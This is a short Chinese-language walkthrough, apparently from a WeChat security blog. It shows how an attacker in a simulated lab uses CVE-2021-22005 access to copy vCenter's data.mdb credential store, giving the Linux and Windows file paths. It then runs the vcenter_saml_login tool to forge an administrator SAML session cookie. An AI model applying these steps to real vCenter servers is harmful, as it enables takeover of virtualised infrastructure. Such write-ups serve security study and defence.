> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/msmgIr3GzsvVff14HGgv6Q)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/GiclhPbvFYkCXrGfXGVnNdC4XE5PDSODs3iabibU0J4ot0JTo3ombzCN005khpVMb4ezVg9cywOTPgkHwhrocGgAg/640?wx_fmt=gif)

    vSphere 是 VMware 推出的虚拟化平台套件，包含 ESXi、vCenter 等一系列的软件。其中 vCenter 为 ESXi 的控制中心，可从单一控制点统一管理数据中心的所有 vSphere 主机和虚拟机，使得运维能够提高控制能力，也使我们作为攻击者能够更快速的对权限进行获取。  
  

    vSphere5 开始引入了单点登录系统，同时使用 SAML 作为授权服务支持。当用户登录服务时，该服务会将身份验证请求转发给 SAML 。SAML 验证用户凭据是否正确以及他们是否有权访问指定的服务。

在下面模拟环境中我们将使用 CVE-2021-22005 获取权限后下载 data.mdb 文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GiclhPbvFYkCXrGfXGVnNdC4XE5PDSODsGMUkVJSwMy93SlSIdzL5qIa4mHRmbdp04m1Hia1QibKcYteW3q3uLJCg/640?wx_fmt=png)

Linux-data.mdb 文件位置:  

```
/storage/db/vmware-vmdir/data.mdb
```

Windows-data.mdb 文件位置:

```
C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GiclhPbvFYkCXrGfXGVnNdC4XE5PDSODsH51kogZiciamdmjbejkHacDbyRxulnUfzjLuGtTpIVudD6YcWMcjqUQg/640?wx_fmt=png)

使用更快捷的脚本从 data.mdb 文件的目录服务信息中提取 LDP 证书并登录 vCenter

此处应注意将 Python 能否与目标 vCenter 通信  

https://github.com/horizon3ai/vcenter_saml_login

```
python3 vcenter_saml_login.py -p data.mdb -t 192.168.0.92
```

获取到 Cookie:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GiclhPbvFYkCXrGfXGVnNdC4XE5PDSODsAuDITKU6KnPWlGobq62tTVtQ6GmxgYqLfWM5Ur6qa0YWGvO0RP9KOA/640?wx_fmt=png)  

添加 Cookie 后访问 https://192.168.xx.xx/ui  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GiclhPbvFYkCXrGfXGVnNdC4XE5PDSODsnibpQ53ibZpr7eiaRDmkN2Ap31fXN3H7hQApJfOQibJGlht6UuPqKiaSUlw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GiclhPbvFYkCXrGfXGVnNdC4XE5PDSODsNic0Tr72j4SSfGqa80AM5lbm8DsY02hmOiaqrYMqBHXATPK8NB3cNt5Q/640?wx_fmt=png)